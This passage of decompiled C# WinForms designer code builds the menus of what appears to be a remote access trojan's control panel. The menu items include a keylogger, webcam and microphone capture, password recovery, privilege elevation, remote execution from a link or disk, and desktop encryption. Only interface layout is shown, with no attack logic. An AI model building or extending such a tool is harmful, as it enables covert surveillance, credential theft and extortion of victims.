			(ToolStripItem)RemoteDesktopToolStripMenuItem1,
			(ToolStripItem)RemoteWebcamToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator1,
			(ToolStripItem)FileManagerToolStripMenuItem,
			(ToolStripItem)ProcessManagerToolStripMenuItem1,
			(ToolStripItem)ToolStripSeparator6,
			(ToolStripItem)KeyloggerToolStripMenuItem1,
			(ToolStripItem)MicrophoneToolStripMenuItem
		});
		((ToolStripItem)ToolStripMenuItem1).set_Image((Image)(object)Resources.Control_Panel_icon);
		((ToolStripItem)ToolStripMenuItem1).set_Name("ToolStripMenuItem1");
		ToolStripMenuItem toolStripMenuItem = ToolStripMenuItem1;
		size = new Size(163, 26);
		((ToolStripItem)toolStripMenuItem).set_Size(size);
		((ToolStripItem)ToolStripMenuItem1).set_Text("Control Center");
		((ToolStripItem)RemoteDesktopToolStripMenuItem1).set_Image((Image)(object)Resources.desctop);
		((ToolStripItem)RemoteDesktopToolStripMenuItem1).set_Name("RemoteDesktopToolStripMenuItem1");
		ToolStripMenuItem remoteDesktopToolStripMenuItem = RemoteDesktopToolStripMenuItem1;
		size = new Size(165, 22);
		((ToolStripItem)remoteDesktopToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoteDesktopToolStripMenuItem1).set_Text("Remote Desktop");
		((ToolStripItem)RemoteWebcamToolStripMenuItem).set_Image((Image)(object)Resources.Devices_webcam_icon);
		((ToolStripItem)RemoteWebcamToolStripMenuItem).set_Name("RemoteWebcamToolStripMenuItem");
		ToolStripMenuItem remoteWebcamToolStripMenuItem = RemoteWebcamToolStripMenuItem;
		size = new Size(165, 22);
		((ToolStripItem)remoteWebcamToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoteWebcamToolStripMenuItem).set_Text("Remote Webcam");
		((ToolStripItem)ToolStripSeparator1).set_Name("ToolStripSeparator1");
		ToolStripSeparator toolStripSeparator = ToolStripSeparator1;
		size = new Size(162, 6);
		((ToolStripItem)toolStripSeparator).set_Size(size);
		((ToolStripItem)FileManagerToolStripMenuItem).set_Image((Image)(object)Resources._1484866729_Card_file);
		((ToolStripItem)FileManagerToolStripMenuItem).set_Name("FileManagerToolStripMenuItem");
		ToolStripMenuItem fileManagerToolStripMenuItem = FileManagerToolStripMenuItem;
		size = new Size(165, 22);
		((ToolStripItem)fileManagerToolStripMenuItem).set_Size(size);
		((ToolStripItem)FileManagerToolStripMenuItem).set_Text("File Manager");
		((ToolStripItem)ProcessManagerToolStripMenuItem1).set_Image((Image)(object)Resources.process);
		((ToolStripItem)ProcessManagerToolStripMenuItem1).set_Name("ProcessManagerToolStripMenuItem1");
		ToolStripMenuItem processManagerToolStripMenuItem = ProcessManagerToolStripMenuItem1;
		size = new Size(165, 22);
		((ToolStripItem)processManagerToolStripMenuItem).set_Size(size);
		((ToolStripItem)ProcessManagerToolStripMenuItem1).set_Text("System Manager");
		((ToolStripItem)ToolStripSeparator6).set_Name("ToolStripSeparator6");
		ToolStripSeparator toolStripSeparator2 = ToolStripSeparator6;
		size = new Size(162, 6);
		((ToolStripItem)toolStripSeparator2).set_Size(size);
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Image((Image)(object)Resources._1472252309_keyboard);
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Name("KeyloggerToolStripMenuItem1");
		ToolStripMenuItem keyloggerToolStripMenuItem = KeyloggerToolStripMenuItem1;
		size = new Size(165, 22);
		((ToolStripItem)keyloggerToolStripMenuItem).set_Size(size);
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Text("Keylogger");
		((ToolStripItem)MicrophoneToolStripMenuItem).set_Image((Image)(object)Resources._1486086930_microphone);
		((ToolStripItem)MicrophoneToolStripMenuItem).set_Name("MicrophoneToolStripMenuItem");
		ToolStripMenuItem microphoneToolStripMenuItem = MicrophoneToolStripMenuItem;
		size = new Size(165, 22);
		((ToolStripItem)microphoneToolStripMenuItem).set_Size(size);
		((ToolStripItem)MicrophoneToolStripMenuItem).set_Text("Audio Feed");
		((ToolStripDropDownItem)ToolStripMenuItem2).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)SystemInformationToolStripMenuItem,
			(ToolStripItem)PasswordRecoveryToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator4,
			(ToolStripItem)ChatToolStripMenuItem,
			(ToolStripItem)PasstimeToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator7,
			(ToolStripItem)TorrentSeederToolStripMenuItem,
			(ToolStripItem)IPTrackerToolStripMenuItem
		});
		((ToolStripItem)ToolStripMenuItem2).set_Image((Image)(object)Resources.extra);
		((ToolStripItem)ToolStripMenuItem2).set_Name("ToolStripMenuItem2");
		ToolStripMenuItem toolStripMenuItem2 = ToolStripMenuItem2;
		size = new Size(163, 26);
		((ToolStripItem)toolStripMenuItem2).set_Size(size);
		((ToolStripItem)ToolStripMenuItem2).set_Text("Extra");
		((ToolStripItem)SystemInformationToolStripMenuItem).set_Image((Image)(object)Resources._1472250796_5314___Windows);
		((ToolStripItem)SystemInformationToolStripMenuItem).set_Name("SystemInformationToolStripMenuItem");
		ToolStripMenuItem systemInformationToolStripMenuItem = SystemInformationToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)systemInformationToolStripMenuItem).set_Size(size);
		((ToolStripItem)SystemInformationToolStripMenuItem).set_Text("System Information");
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Image((Image)(object)Resources.Apps_preferences_desktop_user_password_icon);
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Name("PasswordRecoveryToolStripMenuItem");
		ToolStripMenuItem passwordRecoveryToolStripMenuItem = PasswordRecoveryToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)passwordRecoveryToolStripMenuItem).set_Size(size);
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Text("Password Recovery");
		((ToolStripItem)ToolStripSeparator4).set_Name("ToolStripSeparator4");
		ToolStripSeparator toolStripSeparator3 = ToolStripSeparator4;
		size = new Size(175, 6);
		((ToolStripItem)toolStripSeparator3).set_Size(size);
		((ToolStripItem)ChatToolStripMenuItem).set_Image((Image)(object)Resources.Windows_Messenger_icon);
		((ToolStripItem)ChatToolStripMenuItem).set_Name("ChatToolStripMenuItem");
		ToolStripMenuItem chatToolStripMenuItem = ChatToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)chatToolStripMenuItem).set_Size(size);
		((ToolStripItem)ChatToolStripMenuItem).set_Text("Chat ");
		((ToolStripItem)PasstimeToolStripMenuItem).set_Image((Image)(object)Resources._1472253047_joystick);
		((ToolStripItem)PasstimeToolStripMenuItem).set_Name("PasstimeToolStripMenuItem");
		ToolStripMenuItem passtimeToolStripMenuItem = PasstimeToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)passtimeToolStripMenuItem).set_Size(size);
		((ToolStripItem)PasstimeToolStripMenuItem).set_Text("Pastime");
		((ToolStripItem)ToolStripSeparator7).set_Name("ToolStripSeparator7");
		ToolStripSeparator toolStripSeparator4 = ToolStripSeparator7;
		size = new Size(175, 6);
		((ToolStripItem)toolStripSeparator4).set_Size(size);
		((ToolStripItem)TorrentSeederToolStripMenuItem).set_Image((Image)(object)Resources.uTorrent_icon);
		((ToolStripItem)TorrentSeederToolStripMenuItem).set_Name("TorrentSeederToolStripMenuItem");
		ToolStripMenuItem torrentSeederToolStripMenuItem = TorrentSeederToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)torrentSeederToolStripMenuItem).set_Size(size);
		((ToolStripItem)TorrentSeederToolStripMenuItem).set_Text("Torrent Seeder");
		((ToolStripItem)IPTrackerToolStripMenuItem).set_Image((Image)(object)Resources._039);
		((ToolStripItem)IPTrackerToolStripMenuItem).set_Name("IPTrackerToolStripMenuItem");
		ToolStripMenuItem iPTrackerToolStripMenuItem = IPTrackerToolStripMenuItem;
		size = new Size(178, 22);
		((ToolStripItem)iPTrackerToolStripMenuItem).set_Size(size);
		((ToolStripItem)IPTrackerToolStripMenuItem).set_Text("Request Elevation");
		((ToolStripDropDownItem)ToolStripMenuItem3).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)FromScriptToolStripMenuItem,
			(ToolStripItem)FromLinkToolStripMenuItem,
			(ToolStripItem)FromDiskToolStripMenuItem
		});
		((ToolStripItem)ToolStripMenuItem3).set_Image((Image)(object)Resources.execute);
		((ToolStripItem)ToolStripMenuItem3).set_Name("ToolStripMenuItem3");
		ToolStripMenuItem toolStripMenuItem3 = ToolStripMenuItem3;
		size = new Size(163, 26);
		((ToolStripItem)toolStripMenuItem3).set_Size(size);
		((ToolStripItem)ToolStripMenuItem3).set_Text("Execute");
		((ToolStripItem)FromScriptToolStripMenuItem).set_Image((Image)(object)Resources._1486431809_Untitled_2_28);
		((ToolStripItem)FromScriptToolStripMenuItem).set_Name("FromScriptToolStripMenuItem");
		ToolStripMenuItem fromScriptToolStripMenuItem = FromScriptToolStripMenuItem;
		size = new Size(135, 22);
		((ToolStripItem)fromScriptToolStripMenuItem).set_Size(size);
		((ToolStripItem)FromScriptToolStripMenuItem).set_Text("From Script");
		((ToolStripItem)FromLinkToolStripMenuItem).set_Image((Image)(object)Resources.link);
		((ToolStripItem)FromLinkToolStripMenuItem).set_Name("FromLinkToolStripMenuItem");
		ToolStripMenuItem fromLinkToolStripMenuItem = FromLinkToolStripMenuItem;
		size = new Size(135, 22);
		((ToolStripItem)fromLinkToolStripMenuItem).set_Size(size);
		((ToolStripItem)FromLinkToolStripMenuItem).set_Text("From Link");
		((ToolStripItem)FromDiskToolStripMenuItem).set_Image((Image)(object)Resources.disk);
		((ToolStripItem)FromDiskToolStripMenuItem).set_Name("FromDiskToolStripMenuItem");
		ToolStripMenuItem fromDiskToolStripMenuItem = FromDiskToolStripMenuItem;
		size = new Size(135, 22);
		((ToolStripItem)fromDiskToolStripMenuItem).set_Size(size);
		((ToolStripItem)FromDiskToolStripMenuItem).set_Text("From Disk");
		((ToolStripDropDownItem)ToolStripMenuItem4).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[13]
		{
			(ToolStripItem)InstallInformationToolStripMenuItem,
			(ToolStripItem)PingToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator8,
			(ToolStripItem)UpdateToolStripMenuItem,
			(ToolStripItem)RenameToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator2,
			(ToolStripItem)CloseToolStripMenuItem,
			(ToolStripItem)UnistallToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator3,
			(ToolStripItem)RestartToolStripMenuItem,
			(ToolStripItem)DiconnectToolStripMenuItem,
			(ToolStripItem)ToolStripSeparator5,
			(ToolStripItem)BlockToolStripMenuItem
		});
		((ToolStripItem)ToolStripMenuItem4).set_Image((Image)(object)Resources.bug);
		((ToolStripItem)ToolStripMenuItem4).set_Name("ToolStripMenuItem4");
		ToolStripMenuItem toolStripMenuItem4 = ToolStripMenuItem4;
		size = new Size(163, 26);
		((ToolStripItem)toolStripMenuItem4).set_Size(size);
		((ToolStripItem)ToolStripMenuItem4).set_Text("Client");
		((ToolStripItem)InstallInformationToolStripMenuItem).set_Image((Image)(object)Resources._1472250644_server_information);
		((ToolStripItem)InstallInformationToolStripMenuItem).set_Name("InstallInformationToolStripMenuItem");
		ToolStripMenuItem installInformationToolStripMenuItem = InstallInformationToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)installInformationToolStripMenuItem).set_Size(size);
		((ToolStripItem)InstallInformationToolStripMenuItem).set_Text("Information");
		((ToolStripItem)PingToolStripMenuItem).set_Image((Image)(object)Resources._1486094435_bug_go);
		((ToolStripItem)PingToolStripMenuItem).set_Name("PingToolStripMenuItem");
		ToolStripMenuItem pingToolStripMenuItem = PingToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)pingToolStripMenuItem).set_Size(size);
		((ToolStripItem)PingToolStripMenuItem).set_Text("Ping");
		((ToolStripItem)ToolStripSeparator8).set_Name("ToolStripSeparator8");
		ToolStripSeparator toolStripSeparator5 = ToolStripSeparator8;
		size = new Size(134, 6);
		((ToolStripItem)toolStripSeparator5).set_Size(size);
		((ToolStripDropDownItem)UpdateToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)FromLinkToolStripMenuItem1,
			(ToolStripItem)FromDiskToolStripMenuItem1
		});
		((ToolStripItem)UpdateToolStripMenuItem).set_Image((Image)(object)Resources.bugup);
		((ToolStripItem)UpdateToolStripMenuItem).set_Name("UpdateToolStripMenuItem");
		ToolStripMenuItem updateToolStripMenuItem = UpdateToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)updateToolStripMenuItem).set_Size(size);
		((ToolStripItem)UpdateToolStripMenuItem).set_Text("Update");
		((ToolStripItem)FromLinkToolStripMenuItem1).set_Image((Image)(object)Resources.buglink);
		((ToolStripItem)FromLinkToolStripMenuItem1).set_Name("FromLinkToolStripMenuItem1");
		ToolStripMenuItem fromLinkToolStripMenuItem2 = FromLinkToolStripMenuItem1;
		size = new Size(127, 22);
		((ToolStripItem)fromLinkToolStripMenuItem2).set_Size(size);
		((ToolStripItem)FromLinkToolStripMenuItem1).set_Text("From link");
		((ToolStripItem)FromDiskToolStripMenuItem1).set_Image((Image)(object)Resources.bugdisk);
		((ToolStripItem)FromDiskToolStripMenuItem1).set_Name("FromDiskToolStripMenuItem1");
		ToolStripMenuItem fromDiskToolStripMenuItem2 = FromDiskToolStripMenuItem1;
		size = new Size(127, 22);
		((ToolStripItem)fromDiskToolStripMenuItem2).set_Size(size);
		((ToolStripItem)FromDiskToolStripMenuItem1).set_Text("From Disk");
		((ToolStripItem)RenameToolStripMenuItem).set_Image((Image)(object)Resources.bugren);
		((ToolStripItem)RenameToolStripMenuItem).set_Name("RenameToolStripMenuItem");
		ToolStripMenuItem renameToolStripMenuItem = RenameToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)renameToolStripMenuItem).set_Size(size);
		((ToolStripItem)RenameToolStripMenuItem).set_Text("Rename");
		((ToolStripItem)ToolStripSeparator2).set_Name("ToolStripSeparator2");
		ToolStripSeparator toolStripSeparator6 = ToolStripSeparator2;
		size = new Size(134, 6);
		((ToolStripItem)toolStripSeparator6).set_Size(size);
		((ToolStripItem)CloseToolStripMenuItem).set_Image((Image)(object)Resources.bugdicon);
		((ToolStripItem)CloseToolStripMenuItem).set_Name("CloseToolStripMenuItem");
		ToolStripMenuItem closeToolStripMenuItem = CloseToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)closeToolStripMenuItem).set_Size(size);
		((ToolStripItem)CloseToolStripMenuItem).set_Text("Close");
		((ToolStripItem)UnistallToolStripMenuItem).set_Image((Image)(object)Resources.buguni);
		((ToolStripItem)UnistallToolStripMenuItem).set_Name("UnistallToolStripMenuItem");
		ToolStripMenuItem unistallToolStripMenuItem = UnistallToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)unistallToolStripMenuItem).set_Size(size);
		((ToolStripItem)UnistallToolStripMenuItem).set_Text("Uninstall");
		((ToolStripItem)ToolStripSeparator3).set_Name("ToolStripSeparator3");
		ToolStripSeparator toolStripSeparator7 = ToolStripSeparator3;
		size = new Size(134, 6);
		((ToolStripItem)toolStripSeparator7).set_Size(size);
		((ToolStripItem)RestartToolStripMenuItem).set_Image((Image)(object)Resources.bugrestart__2_);
		((ToolStripItem)RestartToolStripMenuItem).set_Name("RestartToolStripMenuItem");
		ToolStripMenuItem restartToolStripMenuItem = RestartToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)restartToolStripMenuItem).set_Size(size);
		((ToolStripItem)RestartToolStripMenuItem).set_Text("Restart");
		((ToolStripItem)DiconnectToolStripMenuItem).set_Image((Image)(object)Resources.bugg1);
		((ToolStripItem)DiconnectToolStripMenuItem).set_Name("DiconnectToolStripMenuItem");
		ToolStripMenuItem diconnectToolStripMenuItem = DiconnectToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)diconnectToolStripMenuItem).set_Size(size);
		((ToolStripItem)DiconnectToolStripMenuItem).set_Text("Disconnect");
		((ToolStripItem)ToolStripSeparator5).set_Name("ToolStripSeparator5");
		ToolStripSeparator toolStripSeparator8 = ToolStripSeparator5;
		size = new Size(134, 6);
		((ToolStripItem)toolStripSeparator8).set_Size(size);
		((ToolStripItem)BlockToolStripMenuItem).set_Image((Image)(object)Resources._1486431285_ip_block);
		((ToolStripItem)BlockToolStripMenuItem).set_Name("BlockToolStripMenuItem");
		ToolStripMenuItem blockToolStripMenuItem = BlockToolStripMenuItem;
		size = new Size(137, 22);
		((ToolStripItem)blockToolStripMenuItem).set_Size(size);
		((ToolStripItem)BlockToolStripMenuItem).set_Text("Block  IP");
		((ToolStripDropDownItem)SelectToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)SelectAllToolStripMenuItem,
			(ToolStripItem)UnsellectToolStripMenuItem
		});
		((ToolStripItem)SelectToolStripMenuItem).set_Image((Image)(object)Resources._1486095444_table_select_row);
		((ToolStripItem)SelectToolStripMenuItem).set_Name("SelectToolStripMenuItem");
		ToolStripMenuItem selectToolStripMenuItem = SelectToolStripMenuItem;
		size = new Size(163, 26);
		((ToolStripItem)selectToolStripMenuItem).set_Size(size);
		((ToolStripItem)SelectToolStripMenuItem).set_Text("Select");
		((ToolStripItem)SelectAllToolStripMenuItem).set_Image((Image)(object)Resources._1486095474_table_select_big);
		((ToolStripItem)SelectAllToolStripMenuItem).set_Name("SelectAllToolStripMenuItem");
		ToolStripMenuItem selectAllToolStripMenuItem = SelectAllToolStripMenuItem;
		size = new Size(122, 22);
		((ToolStripItem)selectAllToolStripMenuItem).set_Size(size);
		((ToolStripItem)SelectAllToolStripMenuItem).set_Text("Select All");
		((ToolStripItem)UnsellectToolStripMenuItem).set_Image((Image)(object)Resources._1486095486_table_select);
		((ToolStripItem)UnsellectToolStripMenuItem).set_Name("UnsellectToolStripMenuItem");
		ToolStripMenuItem unsellectToolStripMenuItem = UnsellectToolStripMenuItem;
		size = new Size(122, 22);
		((ToolStripItem)unsellectToolStripMenuItem).set_Size(size);
		((ToolStripItem)UnsellectToolStripMenuItem).set_Text("Unsellect");
		((ToolStripItem)OpenFolderToolStripMenuItem).set_Image((Image)(object)Resources._1486095839_Open);
		((ToolStripItem)OpenFolderToolStripMenuItem).set_Name("OpenFolderToolStripMenuItem");
		ToolStripMenuItem openFolderToolStripMenuItem = OpenFolderToolStripMenuItem;
		size = new Size(163, 26);
		((ToolStripItem)openFolderToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenFolderToolStripMenuItem).set_Text("Open Folder");
		((ToolStripDropDownItem)EncryptToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)EncryptDESKTOPToolStripMenuItem,
			(ToolStripItem)DecryptDESKTOPToolStripMenuItem
		});
		((ToolStripItem)EncryptToolStripMenuItem).set_Image((Image)componentResourceManager.GetObject("EncryptToolStripMenuItem.Image"));
		((ToolStripItem)EncryptToolStripMenuItem).set_Name("EncryptToolStripMenuItem");
		ToolStripMenuItem encryptToolStripMenuItem = EncryptToolStripMenuItem;
		size = new Size(163, 26);
		((ToolStripItem)encryptToolStripMenuItem).set_Size(size);
		((ToolStripItem)EncryptToolStripMenuItem).set_Text("Encrypt/Decrypt");
		((ToolStripItem)EncryptDESKTOPToolStripMenuItem).set_Name("EncryptDESKTOPToolStripMenuItem");
		ToolStripMenuItem encryptDESKTOPToolStripMenuItem = EncryptDESKTOPToolStripMenuItem;
		size = new Size(167, 22);
		((ToolStripItem)encryptDESKTOPToolStripMenuItem).set_Size(size);
		((ToolStripItem)EncryptDESKTOPToolStripMenuItem).set_Text("Encrypt DESKTOP");
		((ToolStripItem)DecryptDESKTOPToolStripMenuItem).set_Name("DecryptDESKTOPToolStripMenuItem");
		ToolStripMenuItem decryptDESKTOPToolStripMenuItem = DecryptDESKTOPToolStripMenuItem;
		size = new Size(167, 22);
		((ToolStripItem)decryptDESKTOPToolStripMenuItem).set_Size(size);
		((ToolStripItem)DecryptDESKTOPToolStripMenuItem).set_Text("Decrypt DESKTOP");
		((ToolStripDropDownItem)LockScreenToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)LockToolStripMenuItem,
			(ToolStripItem)UnlockToolStripMenuItem
		});
		((ToolStripItem)LockScreenToolStripMenuItem).set_Image((Image)(object)Resources.icons8_lock_2561);
		((ToolStripItem)LockScreenToolStripMenuItem).set_Name("LockScreenToolStripMenuItem");
		ToolStripMenuItem lockScreenToolStripMenuItem = LockScreenToolStripMenuItem;
		size = new Size(163, 26);
		((ToolStripItem)lockScreenToolStripMenuItem).set_Size(size);
		((ToolStripItem)LockScreenToolStripMenuItem).set_Text("Lock Screen");
		((ToolStripItem)LockToolStripMenuItem).set_Image((Image)(object)Resources.icons8_lock_256);
		((ToolStripItem)LockToolStripMenuItem).set_Name("LockToolStripMenuItem");
		ToolStripMenuItem lockToolStripMenuItem = LockToolStripMenuItem;
		size = new Size(111, 22);
		((ToolStripItem)lockToolStripMenuItem).set_Size(size);
		((ToolStripItem)LockToolStripMenuItem).set_Text("Lock");
		((ToolStripItem)UnlockToolStripMenuItem).set_Image((Image)(object)Resources.icons8_unlock_256);
		((ToolStripItem)UnlockToolStripMenuItem).set_Name("UnlockToolStripMenuItem");
		ToolStripMenuItem unlockToolStripMenuItem = UnlockToolStripMenuItem;
		size = new Size(111, 22);
		((ToolStripItem)unlockToolStripMenuItem).set_Size(size);
		((ToolStripItem)UnlockToolStripMenuItem).set_Text("Unlock");
		((ToolStripDropDownItem)FunToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)StartInfinityMessagesToolStripMenuItem,
			(ToolStripItem)StopInfinityMessagesToolStripMenuItem
		});
		((ToolStripItem)FunToolStripMenuItem).set_Name("FunToolStripMenuItem");
		ToolStripMenuItem funToolStripMenuItem = FunToolStripMenuItem;
		size = new Size(163, 26);
		((ToolStripItem)funToolStripMenuItem).set_Size(size);
		((ToolStripItem)FunToolStripMenuItem).set_Text("Fun");
		((ToolStripItem)StartInfinityMessagesToolStripMenuItem).set_Name("StartInfinityMessagesToolStripMenuItem");
		ToolStripMenuItem startInfinityMessagesToolStripMenuItem = StartInfinityMessagesToolStripMenuItem;
		size = new Size(192, 22);
		((ToolStripItem)startInfinityMessagesToolStripMenuItem).set_Size(size);
		((ToolStripItem)StartInfinityMessagesToolStripMenuItem).set_Text("Start Infinity Messages");
		((ToolStripItem)StopInfinityMessagesToolStripMenuItem).set_Name("StopInfinityMessagesToolStripMenuItem");
		ToolStripMenuItem stopInfinityMessagesToolStripMenuItem = StopInfinityMessagesToolStripMenuItem;
		size = new Size(192, 22);
		((ToolStripItem)stopInfinityMessagesToolStripMenuItem).set_Size(size);
		((ToolStripItem)StopInfinityMessagesToolStripMenuItem).set_Text("Stop Infinity Messages");
		ImageList2.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList2.ImageStream"));
		ImageList2.set_TransparentColor(Color.Transparent);
		ImageList2.get_Images().SetKeyName(0, "home.png");
		ImageList2.get_Images().SetKeyName(1, "group.png");
		ImageList2.get_Images().SetKeyName(2, "settings(1).png");
		ImageList2.get_Images().SetKeyName(3, "business-cards-database.png");
		ImageList2.get_Images().SetKeyName(4, "placeholders.png");
		ImageList2.get_Images().SetKeyName(5, "network.png");
		ImageList2.get_Images().SetKeyName(6, "plug.png");
		ImageList2.get_Images().SetKeyName(7, "settings.png");
		ImageList2.get_Images().SetKeyName(8, "computers.png");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip3;
		size = new Size(20, 20);
		((ToolStrip)contextMenuStrip).set_ImageScalingSize(size);
		((ToolStrip)ContextMenuStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)RemoveCommandToolStripMenuItem });
		((Control)ContextMenuStrip3).set_Name("ContextMenuStrip3");
		ContextMenuStrip contextMenuStrip2 = ContextMenuStrip3;
		size = new Size(178, 26);
		((Control)contextMenuStrip2).set_Size(size);
		((ToolStripItem)RemoveCommandToolStripMenuItem).set_Name("RemoveCommandToolStripMenuItem");
		ToolStripMenuItem removeCommandToolStripMenuItem = RemoveCommandToolStripMenuItem;
		size = new Size(177, 22);
		((ToolStripItem)removeCommandToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoveCommandToolStripMenuItem).set_Text("Remove Command");
		ContextMenuStrip contextMenuStrip3 = ContextMenuStrip2;
		size = new Size(20, 20);
		((ToolStrip)contextMenuStrip3).set_ImageScalingSize(size);
		((ToolStrip)ContextMenuStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)AddToolStripMenuItem,
			(ToolStripItem)RemoveToolStripMenuItem,
			(ToolStripItem)ClearListToolStripMenuItem
		});
		((Control)ContextMenuStrip2).set_Name("ContextMenuStrip2");
		ContextMenuStrip contextMenuStrip4 = ContextMenuStrip2;
		size = new Size(123, 70);
		((Control)contextMenuStrip4).set_Size(size);
		((ToolStripItem)AddToolStripMenuItem).set_Name("AddToolStripMenuItem");
		ToolStripMenuItem addToolStripMenuItem = AddToolStripMenuItem;
		size = new Size(122, 22);
		((ToolStripItem)addToolStripMenuItem).set_Size(size);
		((ToolStripItem)AddToolStripMenuItem).set_Text("Add");
		((ToolStripItem)RemoveToolStripMenuItem).set_Name("RemoveToolStripMenuItem");
		ToolStripMenuItem removeToolStripMenuItem = RemoveToolStripMenuItem;
		size = new Size(122, 22);
		((ToolStripItem)removeToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoveToolStripMenuItem).set_Text("Remove");
		((ToolStripItem)ClearListToolStripMenuItem).set_Name("ClearListToolStripMenuItem");
		ToolStripMenuItem clearListToolStripMenuItem = ClearListToolStripMenuItem;
		size = new Size(122, 22);
		((ToolStripItem)clearListToolStripMenuItem).set_Size(size);
		((ToolStripItem)ClearListToolStripMenuItem).set_Text("Clear List");
		ImageList3.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList3.ImageStream"));
		ImageList3.set_TransparentColor(Color.Transparent);
		ImageList3.get_Images().SetKeyName(0, "1488577767_folder-close.png");
		ImageList3.get_Images().SetKeyName(1, "1488577774_folder-open.png");
		ImageList3.get_Images().SetKeyName(2, "1488577910_file_extension_log.png");
		ImageList3.get_Images().SetKeyName(3, "1488577985_Vector-icons_23.png");
		ImageList3.get_Images().SetKeyName(4, "1488577952_file_extension_txt.png");
		((TabControl)EtherealTabControl2).set_Alignment((TabAlignment)2);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage4);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage5);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage8);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage6);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage7);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage9);
		((Control)EtherealTabControl2).get_Controls().Add((Control)(object)TabPage11);
		((Control)EtherealTabControl2).set_Dock((DockStyle)5);
		((Control)EtherealTabControl2).set_Font(new Font("Verdana", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TabControl)EtherealTabControl2).set_ImageList(ImageList2);
		EtherealTabControl etherealTabControl = EtherealTabControl2;
		size = new Size(40, 150);
		((TabControl)etherealTabControl).set_ItemSize(size);
		EtherealTabControl etherealTabControl2 = EtherealTabControl2;
		location = new Point(0, 0);
		((Control)etherealTabControl2).set_Location(location);
		((TabControl)EtherealTabControl2).set_Multiline(true);
		((Control)EtherealTabControl2).set_Name("EtherealTabControl2");
		((TabControl)EtherealTabControl2).set_SelectedIndex(0);
		EtherealTabControl etherealTabControl3 = EtherealTabControl2;
		size = new Size(1132, 473);
		((Control)etherealTabControl3).set_Size(size);
		((TabControl)EtherealTabControl2).set_SizeMode((TabSizeMode)2);
		((Control)EtherealTabControl2).set_TabIndex(5);
		((Control)TabPage4).get_Controls().Add((Control)(object)StatusStrip4);
		((Control)TabPage4).get_Controls().Add((Control)(object)listV1);
		TabPage tabPage7 = TabPage4;
		location = new Point(154, 4);
		tabPage7.set_Location(location);
		((Control)TabPage4).set_Name("TabPage4");
		TabPage tabPage8 = TabPage4;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage8).set_Padding(padding);
		TabPage tabPage9 = TabPage4;
		size = new Size(974, 465);
		((Control)tabPage9).set_Size(size);
		TabPage4.set_TabIndex(1);
		TabPage4.set_Text("Clients");
		TabPage4.set_UseVisualStyleBackColor(true);
		StatusStrip statusStrip = StatusStrip4;
		size = new Size(20, 20);
		((ToolStrip)statusStrip).set_ImageScalingSize(size);
		((ToolStrip)StatusStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)clientslabel });
		StatusStrip statusStrip2 = StatusStrip4;
		location = new Point(3, 440);
		((Control)statusStrip2).set_Location(location);
		((Control)StatusStrip4).set_Name("StatusStrip4");
		StatusStrip statusStrip3 = StatusStrip4;
		size = new Size(968, 22);
		((Control)statusStrip3).set_Size(size);
		((Control)StatusStrip4).set_TabIndex(3);
		((Control)StatusStrip4).set_Text("StatusStrip4");
		((ToolStripItem)clientslabel).set_Name("clientslabel");
		ToolStripStatusLabel obj = clientslabel;
		size = new Size(254, 17);
